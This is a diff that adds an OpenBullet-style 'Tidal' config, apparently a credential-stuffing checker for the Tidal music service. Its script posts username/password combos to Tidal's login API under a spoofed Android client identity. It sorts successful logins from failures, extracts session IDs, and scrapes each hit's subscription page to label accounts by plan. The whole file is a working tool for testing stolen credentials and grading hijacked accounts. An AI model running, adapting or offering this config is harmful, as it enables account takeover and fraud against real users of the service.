@@ -1,0 +1,71 @@
+[SETTINGS]
+{
+  "Name": "Tidal",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-16T13:08:15.553049-05:00",
+  "AdditionalInfo": "",
+  "Author": "FFaez1267",
+  "Version": "1.0.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.tidal.com/v1/login/username" 
+  CONTENT "username=<USER>&password=<PASS>&token=eM5XROfRd91xUPAJ&clientUniqueKey=1c1bb58dd6a05315&clientVersion=2.11.8" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: TIDAL_ANDROID/899 okhttp/3.13.1" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Username or password is wrong" 
+  KEYCHAIN Success OR 
+    KEY "{\"userId\":" 
+
+PARSE "<SOURCE>" JSON "userId" -> VAR "userId" 
+
+PARSE "<SOURCE>" JSON "sessionId" -> VAR "sessionId" 
+
+REQUEST GET "https://api.tidal.com/v1/users/<userId>/profileUrl?countryCode=US" 
+  
+  HEADER "X-Tidal-SessionId: <sessionId>" 
+  HEADER "User-Agent: TIDAL_ANDROID/899 okhttp/3.13.1" 
+
+PARSE "<SOURCE>" JSON "url" -> VAR "url" 
+
+REQUEST GET "<url>" ReadResponseSource=FALSE 
+  
+  HEADER "X-Tidal-SessionId: <sessionId>" 
+  HEADER "User-Agent: TIDAL_ANDROID/899 okhttp/3.13.1" 
+
+REQUEST GET "https://my.tidal.com/us/account/subscription" 
+  
+  HEADER "X-Tidal-SessionId: <sessionId>" 
+  HEADER "User-Agent: TIDAL_ANDROID/899 okhttp/3.13.1" 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "div class=\"notification-info\"><p>You currently have no subscription.</p></div>" 
+  KEYCHAIN Success OR 
+    KEY "You have an active subscription" 
+
+PARSE "<SOURCE>" LR "active subscription. " "</p></div>" -> VAR "plan1" 
+
+FUNCTION Replace "Please log in to your iTunes account to administer your subscription" "Billed Through Itunes" "<plan1>" -> CAP "Plan" 
+
+FUNCTION Replace "Please contact customer support to administer your account" "Active Plan" "<plan1>" -> CAP "Plan" 
+
